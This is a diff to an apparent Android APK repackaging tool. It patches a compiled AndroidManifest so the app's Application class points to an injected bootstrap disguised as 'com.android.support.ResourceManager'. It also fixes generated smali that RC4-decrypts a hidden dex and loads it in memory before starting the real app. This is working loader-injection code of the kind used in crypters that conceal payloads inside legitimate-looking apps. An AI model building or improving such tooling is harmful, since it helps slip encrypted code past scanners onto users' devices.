@@ -4780,27 +4780,100 @@ class AssetCompiler:
                     elif item.filename == 'AndroidManifest.xml':
                         # Update android:name in <application> tag to point to
                         # ResourceManager bootstrap so Android loads it first.
-                        # Binary XML — update string in-place using byte replacement.
+                        # Uses proper AXML UTF-8 string pool patching — NOT blind
+                        # bytes.replace() which corrupts string pool offset table.
                         manifest_bytes = zin.read(item.filename)
-                        # Encode old and new Application class names as UTF-16LE
-                        # (binary XML stores strings as UTF-16LE)
-                        old_app_name = app_package.replace('.', '/')
-                        old_app_utf16 = (app_package).encode('utf-16-le')
-                        new_app_utf16 = b'com.android.support.ResourceManager'.encode('utf-16-le')
-                        # Also handle dot-notation in binary XML string pool
-                        if old_app_utf16 in manifest_bytes:
-                            manifest_bytes = manifest_bytes.replace(
-                                old_app_utf16, new_app_utf16, 1
-                            )
+
+                        # Trim any garbage bytes appended after declared AXML size
+                        declared_size = struct.unpack_from('<I', manifest_bytes, 4)[0]
+                        if len(manifest_bytes) > declared_size:
+                            manifest_bytes = manifest_bytes[:declared_size]
+
+                        def _patch_axml_string(data, old_str, new_str):
+                            """
+                            Properly patch a string in a binary AXML UTF-8 string pool.
+                            Updates: string entry bytes, length prefixes, string offset
+                            table for all entries after the patched one, string pool
+                            chunk size, and top-level AXML file size.
+                            Works for both 1-byte and 2-byte length prefix encodings.
+                            """
+                            def _enc_len(n):
+                                return bytes([(n >> 8) | 0x80, n & 0xFF]) if n > 0x7F else bytes([n])
+                            def _make_entry(s):
+                                enc = s.encode('utf-8')
+                                return _enc_len(len(s)) + _enc_len(len(enc)) + enc + b'\x00'
+
+                            SP = 8
+                            sp_hdr  = struct.unpack_from('<H', data, SP + 2)[0]
+                            sp_cnt  = struct.unpack_from('<I', data, SP + 8)[0]
+                            sp_strt = struct.unpack_from('<I', data, SP + 20)[0]
+                            off_base = SP + sp_hdr
+                            str_base = SP + sp_strt
+                            old_enc  = old_str.encode('utf-8')
+
+                            target_idx = target_abs = old_elen = None
+                            for i in range(sp_cnt):
+                                rel = struct.unpack_from('<I', data, off_base + i * 4)[0]
+                                ap  = str_base + rel
+                                b0  = data[ap]
+                                pfx = 2 if b0 & 0x80 else 1
+                                b1  = data[ap + pfx]
+                                pfx2 = pfx + (2 if b1 & 0x80 else 1)
+                                bl   = ((b1 & 0x7F) << 8 | data[ap + pfx + 1]) if b1 & 0x80 else b1
+                                if data[ap + pfx2: ap + pfx2 + bl] == old_enc:
+                                    target_idx = i
+                                    target_abs = ap
+                                    old_elen   = pfx2 + bl + 1  # +1 null terminator
+                                    break
+
+                            if target_idx is None:
+                                return data, False
+
+                            new_entry = _make_entry(new_str)
+                            delta     = len(new_entry) - old_elen
+                            data = (data[:target_abs]
+                                    + new_entry
+                                    + data[target_abs + old_elen:])
+
+                            if delta != 0:
+                                for i in range(target_idx + 1, sp_cnt):
+                                    p = off_base + i * 4
+                                    data = (data[:p]
+                                            + struct.pack('<I',
+                                                struct.unpack_from('<I', data, p)[0] + delta)
+                                            + data[p + 4:])
+                                data = (data[:SP + 4]
+                                        + struct.pack('<I',
+                                            struct.unpack_from('<I', data, SP + 4)[0] + delta)
+                                        + data[SP + 8:])
+                                data = (data[:4]
+                                        + struct.pack('<I',
+                                            struct.unpack_from('<I', data, 4)[0] + delta)
+                                        + data[8:])
+                            return data, True
+
+                        # Try patching real_app_class first, then fallback to app_package
+                        old_class = real_app_class if real_app_class else app_package
+                        new_class = 'com.android.support.ResourceManager'
+                        patched, found = _patch_axml_string(
+                            manifest_bytes, old_class, new_class)
+                        if not found and old_class != app_package:
+                            patched, found = _patch_axml_string(
+                                manifest_bytes, app_package, new_class)
+                        if found:
+                            manifest_bytes = patched
                             logger.info(
-                                f"[AssetCompiler] Manifest updated — "
-                                f"Application class → com.android.support.ResourceManager"
+                                "[AssetCompiler] Manifest patched — Application class "
+                                "→ com.android.support.ResourceManager "
+                                "(string pool offsets + chunk sizes updated correctly)"
                             )
                         else:
                             logger.warning(
-                                f"[AssetCompiler] Could not find {app_package} "
-                                f"in binary manifest — app may not launch correctly"
+                                f"[AssetCompiler] Could not locate '{old_class}' "
+                                f"in binary manifest string pool — "
+                                f"app may not launch correctly"
                             )
+
                         mf_info              = zipfile.ZipInfo('AndroidManifest.xml')
                         mf_info.compress_type = zipfile.ZIP_STORED
                         zout.writestr(mf_info, manifest_bytes)
@@ -4882,16 +4955,15 @@ class AssetCompiler:
 
         # Resolve real Application class name for REAL_APP_CLASS field in bootstrap
         # This MUST be the actual Application subclass (e.g. com.android.pictach.App)
-        # NOT just the package name — loadClass(packageName) will throw ClassNotFoundException
-        # Priority: explicitly passed real_app_class > fall back to package + ".App" convention
+        # NOT just the package name — loadClass(packageName) throws ClassNotFoundException
+        # Priority: explicitly passed real_app_class > android.app.Application default
         if real_app_class and '.' in real_app_class and real_app_class != app_package:
             # Use the confirmed class name from AndroidManifest android:name
             app_class_path = real_app_class.replace('.', '/')
         else:
-            # Fallback: package name only — bootstrap will try to load it
-            # If the app has no custom Application class, android.app.Application is used
-            # In that case we store the package path and bootstrap falls back gracefully
-            app_class_path = app_package.replace('.', '/')
+            # No custom Application class declared — fall back to Android base class
+            # bootstrap will instantiate android.app.Application directly
+            app_class_path = 'android/app/Application'
 
         # Generate the smali source for the bootstrap loader
         smali_source = self._build_bootstrap_smali(
@@ -5100,7 +5172,8 @@ class AssetCompiler:
 
     # Step 6 — Wrap decoded bytes in ByteBuffer for InMemoryDexClassLoader
     # Fix: ByteBuffer is abstract — use static wrap() directly, no new-instance
-    invoke-static {{v0}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;\n    move-result-object v1
+    invoke-static {{v0}}, Ljava/nio/ByteBuffer;->wrap([B)Ljava/nio/ByteBuffer;
+    move-result-object v1
 
     const/4 v2, 0x1
     new-array v2, v2, [Ljava/nio/ByteBuffer;
@@ -5111,7 +5184,7 @@ class AssetCompiler:
     move-result-object v3
 
     new-instance v1, Ldalvik/system/InMemoryDexClassLoader;
-    invoke-direct {{v1, v2, v3}}, Ldalvik/system/InMemoryDexClassLoader;->([Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
+    invoke-direct {{v1, v2, v3}}, Ldalvik/system/InMemoryDexClassLoader;-><init>([Ljava/nio/ByteBuffer;Ljava/lang/ClassLoader;)V
 
     # Step 7 — Find real Application class via ClassLoader
     # Fix: loadClass takes single String argument only — not (String, boolean)
@@ -5148,14 +5221,16 @@ class AssetCompiler:
 .method private static rc4Decode([B[B)[B
     .locals 8
 
-    # Build S-box
-    const/16 v0, 256
+    # Build S-box (256 bytes)
+    const/16 v0, 0x100
     new-array v0, v0, [B
 
     # S-box initialisation: S[i] = i
+    # v1 = loop counter, v7 = 256 limit register (if-ge needs two registers)
     const/4 v1, 0x0
+    const/16 v7, 0x100
     :ks_init
-    if-ge v1, 256, :ks_init_done
+    if-ge v1, v7, :ks_init_done
     int-to-byte v2, v1
     aput-byte v2, v0, v1
     add-int/lit8 v1, v1, 0x1
@@ -5166,8 +5241,9 @@ class AssetCompiler:
     array-length v2, p1
     const/4 v1, 0x0
     const/4 v3, 0x0
+    const/16 v7, 0x100
     :ks_loop
-    if-ge v1, 256, :ks_done
+    if-ge v1, v7, :ks_done
     aget-byte v4, v0, v1
     rem-int v5, v1, v2
     aget-byte v5, p1, v5
@@ -5238,7 +5314,6 @@ class AssetCompiler:
 
 .end method
 
-.end class
 """
 
     def _compile_smali_to_dex(self, smali_source: str) -> bytes:
@@ -6884,8 +6959,9 @@ class ManualControlEngine:
                 # Pre-generate Step-18 keys — store in keystore_ctx for Step-18 to use
                 dex_enc_primary_key   = os.urandom(32)
                 dex_enc_secondary_key = os.urandom(32)
-                keystore_ctx["dex_enc_primary_key"]   = dex_enc_primary_key
-                keystore_ctx["dex_enc_secondary_key"] = dex_enc_secondary_key
+                if keystore_ctx is not None:
+                    keystore_ctx["dex_enc_primary_key"]   = dex_enc_primary_key
+                    keystore_ctx["dex_enc_secondary_key"] = dex_enc_secondary_key
 
                 protector = AssetCompiler()
                 r = protector.apply(
